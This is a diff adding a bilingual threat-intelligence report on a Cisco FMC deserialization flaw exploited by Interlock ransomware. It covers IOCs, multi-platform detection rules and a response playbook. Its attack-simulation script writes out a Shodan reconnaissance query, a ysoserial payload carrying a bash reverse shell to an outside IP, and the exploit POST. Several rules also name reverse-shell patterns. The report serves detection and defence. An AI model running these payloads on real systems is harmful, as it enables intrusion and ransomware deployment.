+        <div class="mtt-desc" data-en="FMC stores SSH keys and device credentials in its database for managed device access. Attacker dumps these and uses them to SSH into all managed Cisco ASA/FTD devices and internal network segments." data-tr="FMC, yönetilen cihaz erişimi için SSH anahtarlarını ve cihaz kimlik bilgilerini veritabanında depolar. Saldırgan bunları ele geçirerek tüm yönetilen Cisco ASA/FTD cihazlarına ve dahili ağ segmentlerine SSH ile erişir.">FMC stores SSH keys and device credentials in its database for managed device access. Attacker dumps these credentials and uses them to SSH into all managed Cisco ASA/FTD devices and internal network segments.</div>
+        <div class="mtt-evidence">
+          <div class="mtt-evidence-hd">
+            <span class="mtt-evidence-title" data-en="SSH Auth Log" data-tr="SSH Kimlik Doğrulama Günlüğü">SSH Auth Log</span>
+            <span class="mtt-evidence-src">Firewall /var/log/secure (multiple devices)</span>
+          </div>
+          <div class="mtt-evidence-body">Accepted publickey for admin from 192.168.1.10
+  (FMC management IP) port 44321 ssh2
+&rarr; Identical pattern seen on 23 managed FTD devices
+&rarr; Lateral movement within 90 minutes of initial shell</div>
+        </div>
+      </div>
+
+      <div class="mtt-item">
+        <div class="mtt-tactic" data-en="Impact" data-tr="Etki">Impact</div>
+        <div class="mtt-technique-title">T1486 &mdash; Data Encrypted for Impact (Interlock Ransomware)</div>
+        <div class="mtt-tids"><span class="mtt-tid">T1486</span><span class="mtt-tid">T1657</span></div>
+        <div class="mtt-desc" data-en="Interlock ransomware binary deployed to FMC and lateral Windows systems. FMC configuration database encrypted — entire managed firewall estate unmanageable. Double-extortion: payment demanded + threat to publish exfiltrated network architecture." data-tr="Interlock fidye yazılımı binary'si FMC'ye ve yanal Windows sistemlere dağıtıldı. FMC yapılandırma veritabanı şifrelendi — tüm yönetilen güvenlik duvarı varlığı yönetilemez hale geldi. Çifte gasp: ödeme talebi + sızdırılan ağ mimarisini yayınlama tehdidi.">Interlock ransomware binary deployed to FMC and lateral Windows systems. FMC configuration database encrypted &mdash; entire managed firewall estate unmanageable. Double-extortion: payment demanded + threat to publish exfiltrated network architecture.</div>
+        <div class="mtt-evidence">
+          <div class="mtt-evidence-hd">
+            <span class="mtt-evidence-title" data-en="File System Change" data-tr="Dosya Sistemi Değişikliği">File System Change</span>
+            <span class="mtt-evidence-src">FMC /var/sf/database/</span>
+          </div>
+          <div class="mtt-evidence-body">-rw-r--r-- 1 root root 2.1G sfconfig.db.interlock
+-rw-r--r-- 1 root root    84 README_INTERLOCK.txt
+Contents: "Your network is encrypted. Contact us at..."
+-- sfconfig.db (FMC configuration DB) encrypted in-place
+-- Time from initial POST to encryption: 3h 47m</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ══ IOCs ══ -->
+  <div class="reveal" id="iocs">
+    <div class="section-label" data-en="Indicators of Compromise" data-tr="Uzlaşma Göstergeleri">Indicators of Compromise</div>
+    <h2 data-en="IOCs — Use for Threat Hunting" data-tr="IOC'ler — Tehdit Avı İçin Kullanın">IOCs &mdash; Use for Threat Hunting</h2>
+    <div class="table-wrap">
+      <table class="ioc-table">
+        <thead>
+          <tr>
+            <th>Indicator</th>
+            <th>Type</th>
+            <th>Confidence</th>
+            <th>VirusTotal</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><code class="ioc-val">185.220.101.47</code></td>
+            <td><span class="ioc-type">IP (Attacker C2)</span></td>
+            <td><span class="ioc-conf high">HIGH</span></td>
+            <td><a class="vt-btn" href="https://www.virustotal.com/gui/ip-address/185.220.101.47" target="_blank" rel="noopener">VT &nearr;</a></td>
+          </tr>
+          <tr>
+            <td><code class="ioc-val">README_INTERLOCK.txt</code></td>
+            <td><span class="ioc-type">Filename</span></td>
+            <td><span class="ioc-conf high">HIGH</span></td>
+            <td>&mdash;</td>
+          </tr>
+          <tr>
+            <td><code class="ioc-val">application/x-java-serialized-object</code></td>
+            <td><span class="ioc-type">HTTP Content-Type</span></td>
+            <td><span class="ioc-conf high">HIGH</span></td>
+            <td>&mdash;</td>
+          </tr>
+          <tr>
+            <td><code class="ioc-val">CommonsCollections6</code></td>
+            <td><span class="ioc-type">Gadget Chain</span></td>
+            <td><span class="ioc-conf medium">MED</span></td>
+            <td>&mdash;</td>
+          </tr>
+          <tr>
+            <td><code class="ioc-val">/bin/bash -i &gt;&amp; /dev/tcp/</code></td>
+            <td><span class="ioc-type">Bash Reverse Shell</span></td>
+            <td><span class="ioc-conf high">HIGH</span></td>
+            <td>&mdash;</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ══ DETECTION ══ -->
+  <div class="reveal" id="detection">
+    <div class="team-label team-blue">&#128309; Blue Team</div>
+    <div class="section-label" data-en="Detection Engineering" data-tr="Tespit Mühendisliği">Detection Engineering</div>
+    <h2 data-en="Detection Rules — 11 Platforms" data-tr="Tespit Kuralları — 11 Platform">Detection Rules &mdash; 11 Platforms</h2>
+    <p data-en="All rules are TTP-based and behavioral. SIEM rules detect anomalous HTTP POST patterns and reverse shell activity. EDR/XDR rules catch JVM spawning shells. The YARA rule covers the serialized gadget chain byte pattern." data-tr="Tüm kurallar TTP tabanlı ve davranışsaldır. SIEM kuralları anormal HTTP POST modellerini ve ters shell aktivitesini tespit eder. EDR/XDR kuralları JVM'nin shell başlatmasını yakalar. YARA kuralı serileştirilmiş gadget zinciri byte modelini kapsar.">All rules are <strong>TTP-based and behavioral</strong>. SIEM rules detect anomalous HTTP POST patterns and reverse shell activity. EDR/XDR rules catch JVM spawning shells. The YARA rule covers the serialized gadget chain byte pattern.</p>
+
+    <!-- SIEM GROUP -->
+    <div class="rule-group">
+      <div class="rule-group-hd">
+        <span class="rgb-siem">SIEM</span>
+        <span class="rule-group-label">Rules 1&ndash;4: Sigma (YAML) / Sentinel (KQL) / Splunk (SPL) / QRadar (AQL)</span>
+      </div>
+
+      <!-- Rule 1: Sigma -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">Sigma (YAML)</span>
+            Java Serialized Object POST to FMC API
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              sigma-fmc-java-deser.yml &mdash; T1190 / CWE-502
+            </div>
+            <div class="code-body"><span class="kw">title</span>: Cisco FMC &mdash; Java Deserialization Exploit Attempt
+<span class="kw">id</span>: 7f2a9b1c-4e5d-8f0a-2b3c-6d7e8f9a0b1c
+<span class="kw">status</span>: experimental
+<span class="kw">description</span>: Detects HTTP POST with Java serialized object Content-Type
+           targeting Cisco FMC management API &mdash; CVE-2026-20131
+<span class="kw">author</span>: TI-DE
+<span class="kw">date</span>: <span class="num">2026/03/28</span>
+<span class="kw">tags</span>:
+  - attack.initial_access
+  - attack.t1190
+  - cve.2026-20131
+<span class="kw">logsource</span>:
+  category: webserver
+  product: cisco_fmc
+<span class="kw">detection</span>:
+  selection:
+    cs-method: <span class="str">'POST'</span>
+    cs-uri-stem|contains: <span class="str">'/api/fmc_config/'</span>
+    cs-Content-Type|contains: <span class="str">'java-serialized-object'</span>
+  condition: selection
+<span class="kw">falsepositives</span>:
+  - Legitimate Java API clients sending serialized objects
+<span class="kw">level</span>: high</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 2: Sentinel KQL -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">Microsoft Sentinel (KQL)</span>
+            Reverse Shell from FMC Process
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              sentinel-fmc-reverse-shell.kql &mdash; T1059.004
+            </div>
+            <div class="code-body"><span class="cmt">// Syslog from FMC auditd — bash spawned by Java parent</span>
+<span class="fn">Syslog</span>
+| <span class="kw">where</span> SyslogMessage <span class="kw">contains</span> <span class="str">"EXECVE"</span>
+  <span class="kw">and</span> SyslogMessage <span class="kw">contains</span> <span class="str">"/bin/bash"</span>
+  <span class="kw">and</span> SyslogMessage <span class="kw">contains</span> <span class="str">"/dev/tcp/"</span>
+| <span class="fn">parse</span> SyslogMessage <span class="kw">with</span> * <span class="str">"uid="</span> uid <span class="str">" "</span> *
+| <span class="kw">where</span> uid == <span class="str">"0"</span>
+| <span class="fn">project</span> TimeGenerated, HostName, SyslogMessage, uid
+| <span class="fn">extend</span> Severity = <span class="str">"Critical"</span>, TTP = <span class="str">"T1059.004 - Unix Shell (FMC RCE)"</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 3: Splunk SPL -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">Splunk (SPL)</span>
+            FMC IPS Policy Disabled — Database Tamper
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              splunk-fmc-ips-disabled.spl &mdash; T1562.001
+            </div>
+            <div class="code-body"><span class="fn">index</span>=cisco_fmc <span class="kw">sourcetype</span>=fmc_audit
+| <span class="kw">where</span> <span class="fn">like</span>(Description, <span class="str">"%intrusion_policy%enabled%0%"</span>)
+   OR <span class="fn">like</span>(Description, <span class="str">"%ips_policy_id%NULL%"</span>)
+| <span class="fn">stats</span> count <span class="kw">by</span> _time, Source, UserName, Description, PolicyName
+| <span class="kw">where</span> UserName != <span class="str">"admin"</span>
+| <span class="fn">eval</span> alert=<span class="str">"IPS policy disabled by non-admin — RCE indicator"</span>
+| <span class="fn">table</span> _time, Source, UserName, PolicyName, alert</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 4: QRadar AQL -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">QRadar (AQL)</span>
+            Cisco FMC Exploit POST — Java Content-Type
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              qradar-fmc-java-post.aql &mdash; T1190
+            </div>
+            <div class="code-body"><span class="kw">SELECT</span> sourceip, destinationip, <span class="str">"HTTP Method"</span>,
+       <span class="str">"HTTP URI"</span>, <span class="str">"Content Type"</span>, eventcount
+<span class="kw">FROM</span> events
+<span class="kw">WHERE</span> <span class="str">"HTTP Method"</span> = <span class="str">'POST'</span>
+  <span class="kw">AND</span> <span class="str">"HTTP URI"</span> <span class="kw">ILIKE</span> <span class="str">'%/api/fmc_config/%'</span>
+  <span class="kw">AND</span> <span class="str">"Content Type"</span> <span class="kw">ILIKE</span> <span class="str">'%java-serialized%'</span>
+  <span class="kw">AND</span> LOGSOURCETYPENAME(logsourceid) = <span class="str">'Cisco FMC'</span>
+<span class="kw">AND</span> starttime > <span class="fn">NOW</span>() - <span class="num">24</span> HOURS
+<span class="kw">ORDER BY</span> starttime <span class="kw">DESC</span></div>
+          </div>
+        </div>
+      </div>
+    </div><!-- /SIEM group -->
+
+    <!-- EDR/XDR GROUP -->
+    <div class="rule-group">
+      <div class="rule-group-hd">
+        <span class="rgb-edr">EDR / XDR</span>
+        <span class="rule-group-label">Rules 5&ndash;10: Defender (KQL) / Cortex XDR (XQL) / CrowdStrike (SPL) / CrowdStrike IOA / Carbon Black (CBQL) / SentinelOne (PowerQuery)</span>
+      </div>
+
+      <!-- Rule 5: MDE KQL -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">Defender for Endpoint (KQL)</span>
+            Java Process Spawning Bash Shell
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              mde-java-spawn-bash.kql &mdash; T1059.004 / T1203
+            </div>
+            <div class="code-body"><span class="fn">DeviceProcessEvents</span>
+| <span class="kw">where</span> InitiatingProcessFileName <span class="fn">in~</span> (<span class="str">"java"</span>, <span class="str">"java8"</span>, <span class="str">"java11"</span>)
+| <span class="kw">where</span> FileName == <span class="str">"bash"</span> <span class="kw">or</span> FileName == <span class="str">"sh"</span>
+| <span class="kw">where</span> ProcessCommandLine <span class="fn">has_any</span> (<span class="str">"/dev/tcp/"</span>, <span class="str">"/dev/udp/"</span>, <span class="str">"bash -i"</span>)
+| <span class="fn">project</span> Timestamp, DeviceName, AccountName,
+          InitiatingProcessFileName, FileName, ProcessCommandLine
+| <span class="fn">extend</span> TTP = <span class="str">"T1059.004 - Unix Shell via Java (FMC RCE)"</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 6: Cortex XQL -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">Cortex XDR (XQL)</span>
+            Java Spawning Interactive Shell
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              cortex-java-shell.xql &mdash; T1059.004
+            </div>
+            <div class="code-body"><span class="kw">dataset</span> = xdr_data
+| <span class="kw">filter</span> event_type = ENUM.EVENT_TYPE_PROCESS
+| <span class="kw">filter</span> actor_process_image_name <span class="kw">in</span> (<span class="str">"java"</span>, <span class="str">"java8"</span>, <span class="str">"java11"</span>)
+| <span class="kw">filter</span> causality_actor_process_image_name <span class="kw">in</span> (<span class="str">"bash"</span>, <span class="str">"sh"</span>)
+| <span class="kw">filter</span> causality_actor_process_command_line <span class="kw">contains</span> <span class="str">"/dev/tcp"</span>
+   <span class="kw">or</span> causality_actor_process_command_line <span class="kw">contains</span> <span class="str">"bash -i"</span>
+| <span class="fn">fields</span> _time, agent_hostname, actor_process_image_name,
+         causality_actor_process_command_line, actor_effective_uid</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 7: CrowdStrike SPL Hunting -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">CrowdStrike Hunting (SPL)</span>
+            Java Process Reverse Shell — FMC Context
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              crowdstrike-java-revshell.spl &mdash; T1059.004
+            </div>
+            <div class="code-body"><span class="fn">index</span>=crowdstrike <span class="kw">event_simpleName</span>=ProcessRollup2
+| <span class="kw">where</span> ParentBaseFileName LIKE <span class="str">"%java%"</span>
+  AND FileName IN (<span class="str">"bash"</span>, <span class="str">"sh"</span>, <span class="str">"dash"</span>)
+  AND CommandLine LIKE <span class="str">"%/dev/tcp/%"</span>
+| <span class="fn">table</span> _time, ComputerName, UserName, ParentBaseFileName,
+         FileName, CommandLine, UID
+| <span class="fn">eval</span> severity=<span class="str">"Critical"</span>,
+       ttp=<span class="str">"T1059.004 - Java spawning reverse shell"</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 8: CrowdStrike Custom IOA -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">CrowdStrike Custom IOA</span>
+            FMC RCE &mdash; Java Spawning Network Shell
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              crowdstrike-ioa-fmc-java-shell.json &mdash; T1059.004 / T1190
+            </div>
+            <div class="code-body">{
+  <span class="str">"name"</span>: <span class="str">"CVE-2026-20131 FMC RCE &mdash; Java Spawning Shell"</span>,
+  <span class="str">"description"</span>: <span class="str">"Java process spawning bash/sh with /dev/tcp reverse shell"</span>,
+  <span class="str">"platform"</span>: <span class="str">"Linux"</span>,
+  <span class="str">"severity"</span>: <span class="str">"Critical"</span>,
+  <span class="str">"rule_type"</span>: <span class="str">"process"</span>,
+  <span class="str">"disposition"</span>: <span class="str">"Alert + Kill"</span>,
+  <span class="str">"conditions"</span>: [
+    {
+      <span class="str">"field"</span>: <span class="str">"ParentImageFileName"</span>,
+      <span class="str">"operator"</span>: <span class="str">"MATCH"</span>,
+      <span class="str">"value"</span>: <span class="str">".*java.*"</span>
+    },
+    {
+      <span class="str">"field"</span>: <span class="str">"ImageFileName"</span>,
+      <span class="str">"operator"</span>: <span class="str">"MATCH"</span>,
+      <span class="str">"value"</span>: <span class="str">"(bash|sh|dash)"</span>
+    },
+    {
+      <span class="str">"field"</span>: <span class="str">"CommandLine"</span>,
+      <span class="str">"operator"</span>: <span class="str">"MATCH"</span>,
+      <span class="str">"value"</span>: <span class="str">"/dev/tcp/"</span>
+    }
+  ]
+}</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 9: Carbon Black -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">Carbon Black (CBQL)</span>
+            JVM Child Process with Network Redirect
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              cb-java-netshell.cbql &mdash; T1059.004
+            </div>
+            <div class="code-body">process_name:bash AND
+parent_name:java AND
+process_cmdline:*"/dev/tcp"* OR process_cmdline:*"bash -i"*
+| fields device_name, username, process_cmdline,
+         parent_name, parent_cmdline, process_start_time</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 10: SentinelOne -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">SentinelOne (PowerQuery)</span>
+            Java Deserialization Shell Spawn
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              s1-java-shell.pq &mdash; T1059.004 / T1203
+            </div>
+            <div class="code-body">EventType = "ProcessCreation" AND
+SrcProcName ContainsCIS "java" AND
+TgtProcName In ("bash", "sh") AND
+TgtProcCmdLine Contains "/dev/tcp"
+| columns EndpointName, SrcUserName, SrcProcName,
+           TgtProcName, TgtProcCmdLine, EventTime</div>
+          </div>
+        </div>
+      </div>
+    </div><!-- /EDR group -->
+
+    <!-- PATTERN GROUP -->
+    <div class="rule-group">
+      <div class="rule-group-hd">
+        <span class="rgb-pattern">Pattern</span>
+        <span class="rule-group-label">Rule 11: YARA (Pattern)</span>
+      </div>
+
+      <!-- Rule 11: YARA -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">YARA (Pattern)</span>
+            CommonsCollections Java Deserialization Gadget Chain
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              yara-fmc-java-deser.yar &mdash; T1190 / CWE-502
+            </div>
+            <div class="code-body"><span class="kw">rule</span> FMC_Java_Deserialization_Exploit {
+  <span class="kw">meta</span>:
+    description = <span class="str">"CVE-2026-20131 Cisco FMC — CommonsCollections gadget chain"</span>
+    author      = <span class="str">"TI-DE"</span>
+    date        = <span class="str">"2026-03-28"</span>
+    tlp         = <span class="str">"WHITE"</span>
+
+  <span class="kw">strings</span>:
+    <span class="cmt">// Java serialization magic bytes</span>
+    $magic  = { AC ED 00 05 }
+    <span class="cmt">// CommonsCollections package reference</span>
+    $cc     = <span class="str">"org/apache/commons/collections"</span>
+    <span class="cmt">// Transformer chain indicator</span>
+    $trans  = <span class="str">"InvokerTransformer"</span>
+    <span class="cmt">// Runtime exec reference</span>
+    $exec   = <span class="str">"java/lang/Runtime"</span>
+
+  <span class="kw">condition</span>:
+    $magic at 0 and 2 of ($cc, $trans, $exec)
+}</div>
+          </div>
+        </div>
+      </div>
+    </div><!-- /Pattern group -->
+
+  </div>
+
+  <!-- ══ RECOMMENDATIONS ══ -->
+  <div class="reveal" id="recommendations">
+    <div class="team-label team-blue">&#128309; Blue Team</div>
+    <div class="section-label" data-en="Response &amp; Hardening" data-tr="Yanıt ve Sertleştirme">Response &amp; Hardening</div>
+    <h2 data-en="Incident Response Playbook" data-tr="Olay Müdahale Rehberi">Incident Response Playbook</h2>
+
+    <div class="detail-grid">
+      <div class="detail-card">
+        <div class="detail-card-title" data-en="Immediate Actions (0–2h)" data-tr="Anlık Aksiyonlar (0–2s)">Immediate Actions (0&ndash;2h)</div>
+        <div class="detail-row"><div class="detail-key">1</div><div class="detail-val">Patch FMC to version 7.4.2 or 7.2.9 immediately</div></div>
+        <div class="detail-row"><div class="detail-key">2</div><div class="detail-val">Block TCP 443 / 8305 to FMC from all untrusted networks at perimeter</div></div>
+        <div class="detail-row"><div class="detail-key">3</div><div class="detail-val">Check FMC web access logs for POST with Content-Type: java-serialized-object</div></div>
+        <div class="detail-row"><div class="detail-key">4</div><div class="detail-val">Check auditd logs on FMC for /bin/bash EXECVE from java parent</div></div>
+        <div class="detail-row"><div class="detail-key">5</div><div class="detail-val">Verify all IPS/IDS policies are still enabled on all managed devices</div></div>
+      </div>
+      <div class="detail-card">
+        <div class="detail-card-title" data-en="Investigation (2–24h)" data-tr="Soruşturma (2–24s)">Investigation (2&ndash;24h)</div>
+        <div class="detail-row"><div class="detail-key">1</div><div class="detail-val">Treat FMC as compromised — rotate all managed device credentials</div></div>
+        <div class="detail-row"><div class="detail-key">2</div><div class="detail-val">Check for README_INTERLOCK.txt or .interlock file extensions on FMC</div></div>
+        <div class="detail-row"><div class="detail-key">3</div><div class="detail-val">Review SSH auth logs on all FMC-managed devices for lateral movement</div></div>
+        <div class="detail-row"><div class="detail-key">4</div><div class="detail-val">Export and archive FMC configuration before any remediation</div></div>
+        <div class="detail-row"><div class="detail-key">5</div><div class="detail-val">Engage Cisco TAC if patch cannot be applied immediately (mitigation options)</div></div>
+      </div>
+    </div>
+  </div>
+
+</main>
+
+<footer class="site-footer">
+  <div>TI-DE &mdash; Threat Intelligence &amp; Detection Engineering</div>
+  <div>TLP:WHITE &mdash; Free to share &mdash; <a href="https://github.com/mazlumbaydar/TI-DE">GitHub</a></div>
+</footer>
+
+<script>
+/* ═══════════════════════════════════════════════════════════════
+   LANGUAGE TOGGLE
+═══════════════════════════════════════════════════════════════ */
+const LANG_KEY  = 'ti-de-report-lang';
+const THEME_KEY = 'ti-de-report-theme';
+let _lang  = localStorage.getItem(LANG_KEY)  || 'en';
+let _theme = localStorage.getItem(THEME_KEY) || 'dark';
+
+function applyLang(lang) {
+  _lang = lang;
+  localStorage.setItem(LANG_KEY, lang);
+  const btn = document.getElementById('langBtn');
+  if (btn) btn.innerHTML = '&#127760; ' + (lang === 'en' ? 'TR' : 'EN');
+  document.querySelectorAll('[data-en]').forEach(el => {
+    const val = lang === 'en' ? el.dataset.en : (el.dataset.tr || el.dataset.en);
+    el.innerHTML = val;
+  });
+}
+
+function toggleLang() {
+  applyLang(_lang === 'en' ? 'tr' : 'en');
+}
+
+function applyTheme(theme) {
+  _theme = theme;
+  document.documentElement.setAttribute('data-theme', theme);
+  localStorage.setItem(THEME_KEY, theme);
+  const btn = document.getElementById('themeBtn');
+  if (btn) btn.textContent = theme === 'dark' ? '\u2600 Light' : '\uD83C\uDF19 Dark';
+}
+
+function toggleTheme() {
+  applyTheme(_theme === 'dark' ? 'light' : 'dark');
+}
+
+/* ═══════════════════════════════════════════════════════════════
+   SCROLL PROGRESS BAR
+═══════════════════════════════════════════════════════════════ */
+window.addEventListener('scroll', () => {
+  const h = document.documentElement;
+  const pct = h.scrollHeight - h.clientHeight;
+  document.getElementById('prog').style.width = (pct ? (h.scrollTop / pct * 100) : 0) + '%';
+});
+
+/* ═══════════════════════════════════════════════════════════════
+   NAV SCROLL EFFECT
+═══════════════════════════════════════════════════════════════ */
+const nav = document.getElementById('nav');
+window.addEventListener('scroll', () => {
+  nav.classList.toggle('scrolled', window.scrollY > 60);
+});
+
+/* ═══════════════════════════════════════════════════════════════
+   REVEAL ON SCROLL
+═══════════════════════════════════════════════════════════════ */
+const revealObs = new IntersectionObserver(entries => {
+  entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+}, { threshold: 0.06 });
+document.querySelectorAll('.reveal').forEach(el => revealObs.observe(el));
+
+/* ═══════════════════════════════════════════════════════════════
+   STAT COUNTERS
+═══════════════════════════════════════════════════════════════ */
+const countObs = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (!e.isIntersecting) return;
+    const el = e.target;
+    const target = parseFloat(el.dataset.t);
+    const isFloat = String(el.dataset.t).includes('.');
+    const dur = 1200, start = performance.now();
+    const tick = now => {
+      const p = Math.min((now - start) / dur, 1);
+      const v = target * (1 - Math.pow(1 - p, 3));
+      el.textContent = isFloat ? v.toFixed(1) : Math.round(v);
+      if (p < 1) requestAnimationFrame(tick);
+    };
+    requestAnimationFrame(tick);
+    countObs.unobserve(el);
+  });
+});
+document.querySelectorAll('[data-t]').forEach(el => countObs.observe(el));
+
+/* ═══════════════════════════════════════════════════════════════
+   ATTACK CHAIN ANIMATION
+═══════════════════════════════════════════════════════════════ */
+const chainObs = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      document.querySelectorAll('.chain-step').forEach((s, i) => {
+        setTimeout(() => s.classList.add('visible'), i * 160);
+      });
+      chainObs.disconnect();
+    }
+  });
+}, { threshold: 0.08 });
+const chainEl = document.getElementById('chainSteps');
+if (chainEl) chainObs.observe(chainEl);
+
+/* ═══════════════════════════════════════════════════════════════
+   RULE CARD TOGGLES
+═══════════════════════════════════════════════════════════════ */
+function toggleRule(card) { card.classList.toggle('open'); }
+
+/* ═══════════════════════════════════════════════════════════════
+   ATTACK SIMULATION
+═══════════════════════════════════════════════════════════════ */
+const ATV_NODES = ['vn0','vn1','vn2','vn3','vn4','vn5'];
+const ATV_CONNS = ['vc0','vc1','vc2','vc3','vc4'];
+
+const ATV_STEPS = [
+  {
+    node: 0, conn: null, connType: '', nodeType: 'active',
+    stepLabel: 'STEP 1 \u2014 Zero-Day Discovery & Reconnaissance',
+    stepLabelTR: 'ADIM 1 \u2014 S\u0131f\u0131r G\u00fcn Ke\u015ffi ve \u0130stihbarat Toplama',
+    text: 'Interlock identifies CVE-2026-20131 pre-disclosure. Uses Shodan to enumerate internet-exposed FMC instances on TCP 443. Management interfaces exposed for remote admin are the attack surface.',
+    textTR: 'Interlock, CVE-2026-20131\'i a\u00e7\u0131klamadan \u00f6nce tespit eder. TCP 443\'teki internete a\u00e7\u0131k FMC \u00f6rneklerini listelemek i\u00e7in Shodan kullan\u0131r.',
+    cmd: '# Shodan query to find exposed FMC instances\nshodan search "Cisco Firepower Management Center" port:443\n\n# Fingerprinting the target\ncurl -sk https://TARGET/ui/login | grep "FMC"\n# Response reveals FMC version — attacker selects targets\n# running vulnerable versions (< 7.4.2)',
+    explain: 'FMC management interfaces are frequently internet-exposed because administrators need remote access. There is no network-layer indicator of reconnaissance — Shodan queries appear as normal HTTPS traffic.'
+  },
+  {
+    node: 1, conn: 0, connType: 'active', nodeType: 'active',
+    stepLabel: 'STEP 2 \u2014 Malicious HTTP POST Sent to FMC API',
+    stepLabelTR: 'ADIM 2 \u2014 FMC API\'sine K\u00f6t\u00fc Niyetli HTTP POST G\u00f6nderiliyor',
+    text: 'Attacker sends a single HTTP POST to the FMC management API with Content-Type: application/x-java-serialized-object. The serialized payload contains the CommonsCollections6 gadget chain embedding a reverse shell command.',
+    textTR: 'Saldırgan, Content-Type: application/x-java-serialized-object ile FMC yönetim API\'sine tek bir HTTP POST gönderir. Serileştirilmiş payload, ters shell komutu gömülü CommonsCollections6 gadget zincirini içerir.',
+    cmd: '# ysoserial generates the gadget chain payload\njava -jar ysoserial.jar CommonsCollections6 \\\n  "bash -c {bash,-i,>&,/dev/tcp/185.220.101.47/4444,0>&1}" \\\n  > payload.ser\n\n# Single unauthenticated POST\ncurl -sk -X POST https://TARGET/api/fmc_config/v1/... \\\n  -H "Content-Type: application/x-java-serialized-object" \\\n  --data-binary @payload.ser\n# HTTP 200 returned — JVM is executing our command',
